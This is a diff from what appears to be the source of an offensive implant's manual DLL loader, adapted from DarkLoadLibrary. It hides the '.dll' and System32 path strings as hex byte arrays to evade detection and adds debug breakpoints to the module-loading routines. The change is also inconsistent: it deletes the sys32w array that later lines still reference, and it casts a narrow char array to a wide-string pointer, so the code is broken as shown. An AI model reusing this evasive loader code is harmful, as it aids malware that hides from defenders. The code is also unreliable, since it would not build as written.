@@ -5,10 +5,10 @@ using namespace Opsec;
 using namespace Utils;
 using namespace Memory::Methods;
 
-__attribute__((used, section(".rdata"))) wchar_t dot_dll[] = { 0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00 };
-__attribute__((used, section(".rdata"))) wchar_t sys32w[] = {
-	0x43,0x00,0x3a,0x00,0x2f,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,
-	0x2f,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,0x32,0x00,0x00 };
+__attribute__((used, section(".rdata"))) char dot_dll[] = { 0x2e,0x64,0x6c,0x6c,0x00 };
+__attribute__((used, section(".rdata"))) char sys32[] = {
+	0x43,0x3a,0x5c,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,0x5c,0x2a,0x00
+};
 
 namespace Modules {
 
@@ -644,6 +644,7 @@ namespace Modules {
             return false;
         }
 
+		__debugbreak();
 		HANDLE handle = ctx->win32.FindFirstFileW((wchar_t*)sys32w, &data);
 		if (INVALID_HANDLE_VALUE == handle) {
 			goto defer;
@@ -674,7 +675,7 @@ namespace Modules {
             goto defer;
         }
 
-        WcsConcat(module->local_name, sys32w);
+        WcsConcat(module->local_name, (wchar_t*)sys32w);
 		WcsConcat(module->local_name, filename);
 		MemCopy(module->cracked_name, filename, WcsLength(filename));
 
@@ -798,6 +799,7 @@ namespace Modules {
 
     PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
         // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
+		__debugbreak();
         HEXANE;
 
         EXECUTABLE *module = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
